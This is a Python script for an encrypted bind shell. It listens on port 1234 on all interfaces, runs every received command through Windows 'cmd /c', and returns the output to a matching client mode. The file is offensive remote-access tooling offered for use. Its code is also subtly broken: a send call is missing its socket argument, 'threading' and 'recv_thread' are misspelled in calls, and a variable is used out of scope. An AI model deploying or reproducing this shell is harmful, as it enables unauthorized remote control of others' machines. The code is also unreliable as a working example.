import socket, subprocess, threading, argparse
from Crypto.Cipher import AES 
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad






#variables for default port and buffer size for socket
DEFAULT_PORT = 1234
MAX_BUFFER = 4096

#simple encryption. not secure just example
class AESCipher:
	def __init__(self, key=None):
		self.key = key if key else get_random_bytes(32)
		self.cipher = AES.new(self.key, AES.MODE_ECB)

	def encrypt(self, plaintext):
		return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

	def decrypt(self, encrypted):
		return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

	def __str__(self):
		return "Key -> {}".format(self.key.hex())

def encryptyed_send(s, msg):
	s.send(cipher.encrypt(msg).encode("latin-1"))





def execute_cmd(cmd):
	try:
		output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
	except:
		output = b"Command failed!"
	return output 

#test this
#print(execute_cmd("whoami"))

def decode_and_strip(s):
	return s.decode("latin-1").strip()

#shell thread that handles new user connections
def shell_thread(s):
	encryptyed_send(b"[ -- Connected! --]")

	try:
		while True:

			encryptyed_send(s, b"\r\nEnter Command> ")

			data = s.recv(MAX_BUFFER)
			if data:
				buffer = cipher.decrypt(decode_and_strip(data))
				buffer = decode_and_strip(buffer)

				if not buffer or buffer == "exit":
					s.close()
					exit()

			print("> Executing command: '{}'".format(buffer))
			encryptyed_send(s, execute_cmd(buffer))

	except:
		s.close()
		exit()


#send data
def send_thread(s):
	try:
		while True:
			data = input() + "\n"
			encryptyed_send(s, data.encode("latin-1"))

	except:
		s.close()
		exit()

#receive data
def recv_threead(s):
	try:
		while True:
			data = decode_and_strip(s.recv(MAX_BUFFER))
			if data:
				data = cipher.decrypt(data).decode("latin-1")
				print(data, end="", flush=True)

	except:
		s.close()
		exit()


#server
def server():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", DEFAULT_PORT))
	s.listen()

	print("[ -- Starting bind shell! --]")
	while True:
		client_socket, addr = s.accept()
		print("[ -- New user connected! --]")
		treading.Thread(target=shell_thread, args=(client_socket,)).start()

#client
def client(ip):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, DEFAULT_PORT))

	print("[-- Connecting to bind shell! --]")

	threading.Thread(target=send_thread, args=(s,)).start()
	threading.Thread(target=recv_Thread, args=(s,)).start()

#argparse
parser = argparse.ArgumentParser()

#listen
parser.add_argument("-l", "--listen", action="store_true", help="setup a bind shell", required=False)
#connect
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
#key
parser.add_argument("-k", "--key", help="Encryption key", type=str, required=False)
args = parser.parse_args()

if args.connect and not args.key:
	parser.error("-c CONNECT requires -k KEY!")

if args.key:
	cipher = AESCipher(bytearray.fromhex(args.key))
else:
	cipher = AESCipher()

print(cipher)

if args.listen:
	server()
elif args.connect:
	client(args.connect)



